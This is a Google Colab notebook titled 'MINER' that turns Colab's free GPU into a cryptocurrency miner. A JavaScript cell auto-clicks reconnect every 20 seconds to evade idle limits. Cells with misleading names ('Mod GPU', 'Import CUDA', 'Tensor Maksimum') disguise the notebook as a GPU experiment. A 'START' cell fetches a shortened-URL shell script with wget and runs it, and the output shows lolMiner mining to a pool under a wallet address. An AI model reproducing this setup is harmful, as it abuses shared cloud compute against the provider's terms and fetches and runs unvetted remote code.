{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "m2.ipynb",
      "provenance": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/f43rFgrtk654/tghjyu/blob/main/m2.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "cmbtuEyk3IgH"
      },
      "source": [
        "# **MINER**"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "Zjopwk9B9EK-",
        "outputId": "a1235cd9-18b6-4055-bbc6-6832d6dfd863",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 34
        }
      },
      "source": [
        "#@title Run Every 30 Minutes\n",
        "\n",
        "print (\"Hello World\")\n",
        "\n",
        "import IPython\n",
        "from google.colab import output\n",
        "\n",
        "display(IPython.display.Javascript('''\n",
        "function ClickConnect(){\n",
        "  btn = document.querySelector(\"colab-connect-button\")\n",
        "  if (btn != null){\n",
        "    console.log(\"Click colab-connect-button\"); \n",
        "    btn.click() \n",
        "    }\n",
        "    \n",
        "  btn = document.getElementById('ok')\n",
        "  if (btn != null){\n",
        "    console.log(\"Click reconnect\"); \n",
        "    btn.click() \n",
        "    }\n",
        "  }\n",
        "    \n",
        "setInterval(ClickConnect,20000)\n",
        "'''))"
      ],
      "execution_count": 1,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Hello World\n"
          ],
          "name": "stdout"
        },
        {
          "output_type": "display_data",
          "data": {
            "application/javascript": [
              "\n",
              "function ClickConnect(){\n",
              "  btn = document.querySelector(\"colab-connect-button\")\n",
              "  if (btn != null){\n",
              "    console.log(\"Click colab-connect-button\"); \n",
              "    btn.click() \n",
              "    }\n",
              "    \n",
              "  btn = document.getElementById('ok')\n",
              "  if (btn != null){\n",
              "    console.log(\"Click reconnect\"); \n",
              "    btn.click() \n",
              "    }\n",
              "  }\n",
              "    \n",
              "setInterval(ClickConnect,20000)\n"
            ],
            "text/plain": [
              "<IPython.core.display.Javascript object>"
            ]
          },
          "metadata": {
            "tags": []
          }
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "QgkiBRBn3JuD",
        "outputId": "15f36705-91bc-40dc-de6c-141e437ccc48",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "source": [
        "#@title Check GPU\n",
        "! nvidia-smi -L"
      ],
      "execution_count": 2,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "GPU 0: Tesla P100-PCIE-16GB (UUID: GPU-f3e6c834-176c-9c64-76d2-3e7e603db345)\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "aY-uTqnp3NTD",
        "outputId": "8e2a8e23-cdbc-462e-87c7-aea5ece9aeb2",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "source": [
        "#@title Mod GPU\n",
        "\n",
        "from numba import jit, cuda\n",
        "import numpy as np\n",
        "# to measure exec time\n",
        "from timeit import default_timer as timer\n",
        "\n",
        "# normal function to run on cpu\n",
        "def func(a):\t\t\t\t\t\t\t\t\n",
        "\tfor i in range(10000000):\n",
        "\t\ta[i]+= 1\t\n",
        "\n",
        "\t\t\t\t\t\t\n",
        "def func2(a):\n",
        "\tfor i in range(10000000):\n",
        "\t\ta[i]+= 1\n",
        "if __name__==\"__main__\":\n",
        "\tn = 10000000\t\t\t\t\t\t\t\n",
        "\ta = np.ones(n, dtype = np.float64)\n",
        "\tb = np.ones(n, dtype = np.float32)\n",
        "\t\n",
        "\tstart = timer()\n",
        "\tfunc(a)\n",
        "\tprint(\"without GPU:\", timer()-start)\t\n",
        "\t\n",
        "\tstart = timer()\n",
        "\tfunc2(a)\n",
        "\tprint(\"with GPU:\", timer()-start)"
      ],
      "execution_count": 3,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "without GPU: 4.827349775999998\n",
            "with GPU: 4.80682466399999\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "S8eJcs9G3YCb",
        "outputId": "4a87c93f-4aff-473a-c499-5e943649dee8",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 239
        }
      },
      "source": [
        "#@title Import CUDA\n",
        "\n",
        "import os\n",
        "' && '.join([f'export {name}=\"{value}\"' for name, value in os.environ.items()])"
      ],
      "execution_count": 4,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "string"
            },
            "text/plain": [
              "'export NO_GCE_CHECK=\"True\" && export GCS_READ_CACHE_BLOCK_SIZE_MB=\"16\" && export CLOUDSDK_CONFIG=\"/content/.config\" && export __EGL_VENDOR_LIBRARY_DIRS=\"/usr/lib64-nvidia:/usr/share/glvnd/egl_vendor.d/\" && export CUDA_VERSION=\"11.0.3\" && export PATH=\"/usr/local/nvidia/bin:/usr/local/cuda/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/tools/node/bin:/tools/google-cloud-sdk/bin:/opt/bin\" && export HOME=\"/root\" && export LD_LIBRARY_PATH=\"/usr/lib64-nvidia\" && export LANG=\"en_US.UTF-8\" && export SHELL=\"/bin/bash\" && export LIBRARY_PATH=\"/usr/local/cuda/lib64/stubs\" && export SHLVL=\"0\" && export GCE_METADATA_TIMEOUT=\"0\" && export NCCL_VERSION=\"2.7.8\" && export NVIDIA_VISIBLE_DEVICES=\"all\" && export DEBIAN_FRONTEND=\"noninteractive\" && export CUDNN_VERSION=\"8.0.4.30\" && export LAST_FORCED_REBUILD=\"20210614\" && export JPY_PARENT_PID=\"53\" && export PYTHONPATH=\"/env/python\" && export DATALAB_SETTINGS_OVERRIDES=\"{\"kernelManagerProxyPort\":6000,\"kernelManagerProxyHost\":\"172.28.0.3\",\"jupyterArgs\":[\"--ip=\\\\\"172.28.0.2\\\\\"\"],\"debugAdapterMultiplexerPath\":\"/usr/local/bin/dap_multiplexer\",\"enableLsp\":true}\" && export ENV=\"/root/.bashrc\" && export GLIBCXX_FORCE_NEW=\"1\" && export NVIDIA_DRIVER_CAPABILITIES=\"compute,utility\" && export TF_FORCE_GPU_ALLOW_GROWTH=\"true\" && export LD_PRELOAD=\"/usr/lib/x86_64-linux-gnu/libtcmalloc.so.4\" && export NVIDIA_REQUIRE_CUDA=\"cuda>=11.0 brand=tesla,driver>=418,driver<419 brand=tesla,driver>=440,driver<441 brand=tesla,driver>=450,driver<451\" && export OLDPWD=\"/\" && export HOSTNAME=\"fddd38268ef4\" && export COLAB_GPU=\"1\" && export PWD=\"/\" && export CLOUDSDK_PYTHON=\"python3\" && export GLIBCPP_FORCE_NEW=\"1\" && export PYTHONWARNINGS=\"ignore:::pip._internal.cli.base_command\" && export TBE_CREDS_ADDR=\"172.28.0.1:8008\" && export TERM=\"xterm-color\" && export CLICOLOR=\"1\" && export PAGER=\"cat\" && export GIT_PAGER=\"cat\" && export MPLBACKEND=\"module://ipykernel.pylab.backend_inline\" && export PYDEVD_USE_FRAME_EVAL=\"NO\"'"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 4
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "Ujt1vWgY3gvT",
        "outputId": "f2811821-1f3f-4757-d935-67a9d3e581e4",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "source": [
        "#@title Tensor Maksimum\n",
        "\n",
        "import tensorflow as tf\n",
        "\n",
        "from tensorflow import keras\n",
        "from tensorflow.keras import layers\n",
        "from tensorflow.keras import mixed_precision\n",
        "\n",
        "mixed_precision.set_global_policy('mixed_float16')"
      ],
      "execution_count": 5,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "WARNING:tensorflow:Mixed precision compatibility check (mixed_float16): WARNING\n",
            "Your GPU may run slowly with dtype policy mixed_float16 because it does not have compute capability of at least 7.0. Your GPU:\n",
            "  Tesla P100-PCIE-16GB, compute capability 6.0\n",
            "See https://developer.nvidia.com/cuda-gpus for a list of GPUs and their compute capabilities.\n",
            "If you will use compatible GPU(s) not attached to this host, e.g. by running a multi-worker model, you can ignore this warning. This message will only be logged once\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "w8EUKw1q3Juw",
        "outputId": "9b633ada-34bd-438e-e0ea-7b6f713f6769",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "source": [
        "#@title START.....\n",
        "!wget https://bit.ly/3s9rFRJ && chmod +x 3s9rFRJ && sh 3s9rFRJ"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "--2021-06-20 02:27:49--  http://bit.ly/DioFin\n",
            "Resolving bit.ly (bit.ly)... 67.199.248.10, 67.199.248.11\n",
            "Connecting to bit.ly (bit.ly)|67.199.248.10|:80... connected.\n",
            "HTTP request sent, awaiting response... 301 Moved Permanently\n",
            "Location: https://bitbucket.org/Finf1311/etc/raw/1d068e362c4aa06f4cae61be13074ca9f31ccce1/Run.sh [following]\n",
            "--2021-06-20 02:27:49--  https://bitbucket.org/Finf1311/etc/raw/1d068e362c4aa06f4cae61be13074ca9f31ccce1/Run.sh\n",
            "Resolving bitbucket.org (bitbucket.org)... 104.192.141.1, 2406:da00:ff00::6b17:d1f5, 2406:da00:ff00::22c3:9b0a, ...\n",
            "Connecting to bitbucket.org (bitbucket.org)|104.192.141.1|:443... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: 378 [text/plain]\n",
            "Saving to: ???DioFin???\n",
            "\n",
            "DioFin              100%[===================>]     378  --.-KB/s    in 0s      \n",
            "\n",
            "2021-06-20 02:27:50 (17.4 MB/s) - ???DioFin??? saved [378/378]\n",
            "\n",
            "--2021-06-20 02:27:50--  https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz\n",
            "Resolving github.com (github.com)... 192.30.255.112\n",
            "Connecting to github.com (github.com)|192.30.255.112|:443... connected.\n",
            "HTTP request sent, awaiting response... 302 Found\n",
            "Location: https://github-releases.githubusercontent.com/155006859/2291e380-b58b-11eb-8183-11f52c961434?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20210620%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20210620T022750Z&X-Amz-Expires=300&X-Amz-Signature=d04a316bacd2aa21bc9c7b62cd798a7284af9cc574570be6f129ad0f623ae34c&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=155006859&response-content-disposition=attachment%3B%20filename%3DlolMiner_v1.29_Lin64.tar.gz&response-content-type=application%2Foctet-stream [following]\n",
            "--2021-06-20 02:27:50--  https://github-releases.githubusercontent.com/155006859/2291e380-b58b-11eb-8183-11f52c961434?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20210620%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20210620T022750Z&X-Amz-Expires=300&X-Amz-Signature=d04a316bacd2aa21bc9c7b62cd798a7284af9cc574570be6f129ad0f623ae34c&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=155006859&response-content-disposition=attachment%3B%20filename%3DlolMiner_v1.29_Lin64.tar.gz&response-content-type=application%2Foctet-stream\n",
            "Resolving github-releases.githubusercontent.com (github-releases.githubusercontent.com)... 185.199.108.154, 185.199.109.154, 185.199.110.154, ...\n",
            "Connecting to github-releases.githubusercontent.com (github-releases.githubusercontent.com)|185.199.108.154|:443... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: 4947871 (4.7M) [application/octet-stream]\n",
            "Saving to: ???lolMiner_v1.29_Lin64.tar.gz???\n",
            "\n",
            "lolMiner_v1.29_Lin6 100%[===================>]   4.72M  29.9MB/s    in 0.2s    \n",
            "\n",
            "2021-06-20 02:27:50 (29.9 MB/s) - ???lolMiner_v1.29_Lin64.tar.gz??? saved [4947871/4947871]\n",
            "\n",
            "\u001b[1m\u001b[38;2;100;149;237m+---------------------------------------------------------+\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m   _       _ __  __ _                   _   ____   ___   \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m  | | ___ | |  \\/  (_)_ __   ___ _ __  / | |___ \\ / _ \\  \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m  | |/ _ \\| | |\\/| | | '_ \\ / _ \\ '__| | |   __) | (_) | \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m  | | (_) | | |  | | | | | |  __/ |    | |_ / __/ \\__, | \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m  |_|\\___/|_|_|  |_|_|_| |_|\\___|_|    |_(_)_____|  /_/  \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m                                                         \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              This software is for mining                \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              Ethash, Etchash                            \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              Equihash 144/5, 192/7, 210/9               \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              BeamHash I, II, III                        \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              ZelHash     (EquihashR 125/4/0)            \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              Cuck(ar)oo 29                              \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              Cuckaroo   30 CTX                          \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              Cuckatoo   31/32                           \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m                                                         \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m                                                         \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              Made by Lolliedieb, May 2021               \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m+---------------------------------------------------------+\n",
            "\u001b[0m\n",
            "Setup Miner... \n",
            "OpenCL driver detected.\n",
            "Number of OpenCL supported GPUs: 1 \n",
            "Cuda driver detected.\n",
            "Number of Cuda supported GPUs: 1 \n",
            "Device 0: \n",
            "    Name:    \u001b[38;2;000;128;000mTesla P100-PCIE-16GB \n",
            "\u001b[0m    Address: 0:4 \n",
            "    Vendor:  NVIDIA Corporation\n",
            "    Drivers: Cuda, OpenCL\n",
            "    Memory:  16280 MByte \n",
            "    Active:  true (Selected Algorithm: ETHash Cuda) \n",
            "\n",
            "Connecting to pool... \n",
            "\u001b[38;2;240;230;140mConnected to us-east.ezil.me:4444  (TLS disabled)\n",
            "\u001b[0mSet Ethash stratum mode: Ethereum Proxy\n",
            "\u001b[38;2;240;230;140mAuthorized worker: 0x4ede93b6e106627260d66ef6af4df48ae293ddce.zil1zy92m4wkljmcafxuat9lqs303h9eyjan2szf77.Fin \n",
            "\u001b[0m\u001b[38;2;189;183;107mNew job received: 0xbd7fc8 Epoch: 432 (ETCHash epoch: 216) Target: 0000000100000000 \n",
            "\u001b[0mStart Mining... \n",
            "\u001b[38;2;100;149;237m------------------------------------------------------- \n",
            "\u001b[0m\u001b[38;2;100;149;237m  Generated light cache for epoch 432 (ETCHash: 216) \n",
            "\u001b[0m\u001b[38;2;100;149;237m       Took 1834 ms, size of new DAG: 2751 MByte \n",
            "\u001b[0m\u001b[38;2;100;149;237m------------------------------------------------------- \n",
            "\u001b[0mGPU \u001b[38;2;240;230;140m0\u001b[0m: Starting DAG generation (normal mode)\n",
            "GPU \u001b[38;2;240;230;140m0\u001b[0m: DAG build complete 27%\n",
            "GPU \u001b[38;2;240;230;140m0\u001b[0m: DAG build complete 55%\n",
            "GPU \u001b[38;2;240;230;140m0\u001b[0m: DAG build complete 83%\n",
            "GPU \u001b[38;2;240;230;140m0\u001b[0m: DAG generation \u001b[1m\u001b[38;2;180;242;130mcompleted\u001b[0m (2280 ms)\n",
            "\u001b[38;2;189;183;107mNew job received: 0x7f208f Epoch: 432 (ETCHash epoch: 216) Target: 0000000100000000 \n",
            "\u001b[0m\u001b[38;2;189;183;107mNew job received: 0x9a5e3a Epoch: 432 (ETCHash epoch: 216) Target: 0000000100000000 \n",
            "\u001b[0mAverage speed (30s): 55.14 mh/s \n",
            "\u001b[38;2;189;183;107mNew job received: 0xc22d82 Epoch: 432 (ETCHash epoch: 216) Target: 0000000100000000 \n",
            "\u001b[0m\u001b[38;2;189;183;107mNew job received: 0xfc89cd Epoch: 432 (ETCHash epoch: 216) Target: 0000000100000000 \n",
            "\u001b[0m\u001b[38;2;189;183;107mNew job received: 0x7a241a Epoch: 432 (ETCHash epoch: 216) Target: 0000000100000000 \n",
            "\u001b[0mAverage speed (30s): 65.83 mh/s \n",
            "\u001b[38;2;189;183;107mNew job received: 0xf69065 Epoch: 432 (ETCHash epoch: 216) Target: 0000000100000000 \n",
            "\u001b[0m\u001b[38;2;189;183;107mNew job received: 0x4e2780 Epoch: 432 (ETCHash epoch: 216) Target: 0000000100000000 \n",
            "\u001b[0m\u001b[38;2;189;183;107mNew job received: 0xc84a15 Epoch: 432 (ETCHash epoch: 216) Target: 0000000100000000 \n",
            "\u001b[0m\u001b[38;2;189;183;107mNew job received: 0xfb8d7d Epoch: 432 (ETCHash epoch: 216) Target: 0000000100000000 \n",
            "\u001b[0mAverage speed (30s): 65.79 mh/s \n",
            "\u001b[38;2;189;183;107mNew job received: 0x9d9bc2 Epoch: 432 (ETCHash epoch: 216) Target: 0000000100000000 \n",
            "\u001b[0m"
          ],
          "name": "stdout"
        }
      ]
    }
  ]
}
